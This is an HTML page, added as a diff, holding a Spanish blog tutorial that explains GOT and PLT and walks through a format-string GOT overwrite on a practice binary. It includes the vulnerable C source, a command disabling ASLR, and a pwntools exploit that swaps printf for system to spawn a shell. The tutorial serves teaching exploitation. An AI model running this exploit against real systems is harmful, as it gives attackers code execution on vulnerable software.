@@ -1,0 +1,598 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="es" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>GOT overwrite con Format String - c4rta</title>
+<meta name="description" content="En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="es_ES">
+<meta property="og:site_name" content="c4rta">
+<meta property="og:title" content="GOT overwrite con Format String">
+<meta property="og:url" content="http://localhost:4000/got-overwrite/">
+
+
+  <meta property="og:description" content="En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2022-07-30T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/got-overwrite/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "c4rta",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categorias/" >Categorias</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">GOT overwrite con Format String</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="c4rta" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">c4rta</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        CTF player<br>Apasionado a la ciberseguridad
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/ic4rta" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="GOT overwrite con Format String">
+    <meta itemprop="description" content="En este articulo veremos un ejemplo muy simple de como sobreescribir GOT aprovechandonos de una vulnerabilidad format string">
+    <meta itemprop="datePublished" content="July 30, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">GOT overwrite con Format String
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-07-30T00:00:00-05:00">July 30, 2022 </time>&emsp;
+          
+          
+        </p>
+        <h2 id="contenido">Contenido</h2>
+<ul>
+  <li>Global Offset Table (GOT) y Procedure Linked Table (PLT)</li>
+  <li>Analisis del binario</li>
+  <li>Calculando el offset del buffer y la direccion de libc</li>
+  <li>Armando nuestro exploit</li>
+</ul>
+
+<h2 id="got-y-plt">GOT y PLT</h2>
+
+<p>Para entender esto mejor veremos la estructura de un binario ELF.</p>
+
+<p><img src="/assets/images/formatString-got/elf.png" alt="" /></p>
+
+<p>Ahora pondre otra estructura donde <code class="language-plaintext highlighter-rouge">section header table</code> apunta a la seccion <code class="language-plaintext highlighter-rouge">.text</code> , <code class="language-plaintext highlighter-rouge">.radata</code> y <code class="language-plaintext highlighter-rouge">.data</code> del binario, si se dan cuenta la estructura de arriba es mas extensa que la de abajo, esto es por que un archivo ELF tiene dos vistas, <code class="language-plaintext highlighter-rouge">Program header table</code> donde muestra los segmentos utilizados en tiempo de ejecución, y la otra es <code class="language-plaintext highlighter-rouge">section header table</code> que enumera el conjunto de secciones, simplemente en la imagen de arriba no se muesta explicitamente <code class="language-plaintext highlighter-rouge">section header table</code>, pero ambas estructuras son correctas</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|----------------------|
+|      ELF header      |
+|----------------------|
+| Program header table |
+|----------------------|
+|        .text         | &lt;--|
+|----------------------|    |
+|        .rodata       | &lt;--|
+|----------------------|    |
+|        .data         | &lt;--|
+|----------------------|    |
+| section header table | ---|
+|----------------------|
+
+</code></pre></div></div>
+<h3 id="direcciones-de-los-simbolos">Direcciones de los simbolos</h3>
+
+<p>En un binario ELF una seccion de texto necesita saber la direccion virtual absoluta de un simbolo (como por ejemplo una funcion o variable), esto surge de una operacion donde se toma una direccion o una entrada a PLT, por ejemplo una direccion puede ser esto:</p>
+
+<ul>
+  <li>Una constante de tiempo de enlace</li>
+  <li>La base de carga más una constante de tiempo de enlace.</li>
+</ul>
+
+<p>Si se dieron cuenta se menciona la palabra <code class="language-plaintext highlighter-rouge">enlace</code> y esto es por que GOT y PLT se encargan de la gran parte del enlazado dinamico</p>
+
+<p>Imaginemos una situacion donde tomanos el valor de un simbolo, para poder realizar esto tenemos que hacer que el enlazador dinamico busque la direccion en memoria de ese simbolo y reescriba el codigo para solo poder carga una sola direccion, esto es demasiado proceso e incluso aumenta el tamaño del binario, asi que una mejora mucho mas eficiente y eficaz es reservar un espacio en la memoria del binario en la cual se mantendra la direccion de ese simbolo y posteriormente hacer que el enlazador dinamico ponga la direccion alli en lugar de reescribir todo el codigo, esto es gracias a que existe GOT, y GOT se encuenta en una seccion el binario que se llama .got, se puede ver en la primera imagen.</p>
+
+<h3 id="como-trabaja-got-y-plt">¿Como trabaja GOT y PLT?</h3>
+
+<p>GOT trabaja de la siguiente manera, primero GOT se abre como un enlazador dinamico durante la ejecion del binario, posteriormente obtiene las direcciones absolutas de las funciones solicitadas y GOT se actualiza asi mismo segun lo que fue solicitado, despues toma las solicitudes de las ubicaciones que vienen por parte de PLT, una vez que esto se concluya tenemos el paso final en el cual PLT esta vinculado con la direccion de GOT, entonces ahora el binario puede llamar directamente a esa funcion que fue solicitada desde las librerias. Definitavemente GOT y PLT son los mejores amigos</p>
+
+<h3 id="un-pequeño-ejemplo">Un pequeño ejemplo</h3>
+
+<p>El codigo del ejemplo es el siguiente, compilenlo como quieran, ese no es el que se va a explotar, simplemente solo es para ver como se representaria GOT y PLT en debugger</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+        <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Lo que hace este pequeño programa es obtener nuestro input y meterlo en el buffer de 8 bytes usando la funcion <code class="language-plaintext highlighter-rouge">gets</code> para posteriormente imprimirlo con la funcion <code class="language-plaintext highlighter-rouge">puts</code>, pasaremos a meter el binario a gdb y a mostrar el main</p>
+
+<p><img src="/assets/images/formatString-got/got%26plt.png" alt="" /></p>
+
+<p>Podemos visualizar algo como esto, donde se ve que tenemos dos entradas de PLT y ahora nuestas funciones de <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code> pasaron a <code class="language-plaintext highlighter-rouge">gets@plt</code> y <code class="language-plaintext highlighter-rouge">puts@plt</code> y esto es por que no se sabe con exactitud donde esta <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code>por lo que salta a PLT</p>
+
+<p><strong><em>A tomar en cuenta:</em></strong></p>
+
+<ul>
+  <li>En caso de que haya una entrada para <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code>, ambas funcioes saltaran a la direccion que esta almecenada all</li>
+</ul>
+
+<p>*Las direcciones en memoria de las funciones de libc, como <code class="language-plaintext highlighter-rouge">gets</code> y <code class="language-plaintext highlighter-rouge">puts</code> estan almacenadas en GOT</p>
+
+<h3 id="como-nos-podemos-aprovechar-de-esto">¿Como nos podemos aprovechar de esto?</h3>
+
+<p>Si tenemos una entrada PLT que sea de una funcion de libc, podemos redirigir la entrada PLT hacia otra parte</p>
+
+<h3 id="got-overwrite">GOT overwrite</h3>
+
+<p>Esta tecnica consiste en sobreecribir la direccion de GOT de una funcion por una direccion que nosotros queramos, por ejemplo en nuestro binario que vamos a explotar nos vamos a aprovechar de la funcion <code class="language-plaintext highlighter-rouge">printf</code>, entonces si sobreescribe la direccion GOT de <code class="language-plaintext highlighter-rouge">printf</code> por cualquier otra lo que va a pasar es que PLT va a adquirir la direccion GOT que sobreescribimos y ejecuta a lo que hayamos indicado.</p>
+
+<h2 id="analisis-del-binario">Analisis del binario</h2>
+
+<p>Primeramente desactivamos el ASRL con:</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
+
+<p>El binario usado lo saque de: <code class="language-plaintext highlighter-rouge">https://ir0nstone.gitbook.io/notes/</code>, todo el credito para <code class="language-plaintext highlighter-rouge">Andrej (aka ir0nstone)</code></p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">300</span><span class="p">];</span>
+    
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">vuln</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Lo que haces el binario es mantenerse en un bucle infinito recibiendo nuestros inputs con <code class="language-plaintext highlighter-rouge">fgets</code> y mostrandolos con <code class="language-plaintext highlighter-rouge">printf</code> asi que no podemos hacer BoF, si vemos las protecciones del binario lo unico que tenemos activado es PIE pero realmente no nos interesa si esta activado o no.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+</code></pre></div></div>
+
+<h2 id="calculando-el-offset-del-buffer-y-la-direccion-de-libc">Calculando el offset del buffer y la direccion de libc</h2>
+
+<h3 id="direccion-de-libc">Direccion de libc</h3>
+
+<p>Para esto solamente usaremos el comando ldd, y queda asi <code class="language-plaintext highlighter-rouge">ldd got_overwrite-32</code>, nos motrara algo como esto</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	linux-gate.so.1 (0xf7fc3000)
+	libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7c00000)
+	/lib/ld-linux.so.2 =&gt; /usr/lib/ld-linux.so.2 (0xf7fc5000)
+</code></pre></div></div>
+
+<p>Donde la direccion de libc es <code class="language-plaintext highlighter-rouge">0xf7c00000</code></p>
+
+<h3 id="calculando-el-offset-del-buffer">Calculando el offset del buffer</h3>
+
+<p>Viendo que se esta imprimiendo la variable buffer de esta forma <code class="language-plaintext highlighter-rouge">printf(buffer)</code> podemos hace uso de format string, de hecho si le pasamos unos cuantos format string lo que hara es buscar valores de la memoria e imprimirlos como vemos en la imagen</p>
+
+<p><img src="/assets/images/formatString-got/format1.png" alt="" /></p>
+
+<p>Para saber el offset el buffer tenemos que pasarle algunas A en conjunto de unos format string, de esta manera <code class="language-plaintext highlighter-rouge">AAAAAAAA %p %p %p %p %p %p %p</code> esto con el fin de ver desde donde se estan inprimiendo nuestras A, esto nos imprime lo siguiente</p>
+
+<p><img src="/assets/images/formatString-got/format2.png" alt="" /></p>
+
+<p>Entonces si empezamos a contar desde <code class="language-plaintext highlighter-rouge">0x12c</code> hasta donde tengo seleccionado en la imagen, nos da 5, entonces el offset del buffer es 5.</p>
+
+<h2 id="armando-nuestro-exploit">Armando nuestro exploit</h2>
+
+<p>El exploit queda de la siguiente manera</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./got_overwrite-32'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0xf7c00000</span>   
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./got_overwrite-32"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span> <span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]})</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Si vemos en esta parte</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
+</code></pre></div></div>
+
+<p>El numero 5 es el offset del buffer, lo que estamos haciendo aqui <code class="language-plaintext highlighter-rouge">elf.got['printf']</code> es sacar la direccion GOT de <code class="language-plaintext highlighter-rouge">printf</code> y sustuirla por la de system, y mas abajo se llama de esta manera <code class="language-plaintext highlighter-rouge">p.sendline('/bin/sh')</code> ya que es lo que queremos ejecutar</p>
+
+<p>Y ahora si ejecutamos el exploit debimos de obtener una shell</p>
+
+<p><img src="/assets/images/formatString-got/format4.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+
+<p><img src="/assets/images/formatString-got/waifu.jpg" alt="" /></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#formatstr" class="page__taxonomy-item" rel="tag">formatStr</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#gdb" class="page__taxonomy-item" rel="tag">gdb</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#got-plt" class="page__taxonomy-item" rel="tag">got-plt</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categorias/#explotacion-binaria" class="page__taxonomy-item" rel="tag">Explotacion binaria</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-07-30T00:00:00-05:00">July 30, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/ret2libc/" class="pagination--pager" title="ret2libc bypass NX
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 c4rta</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
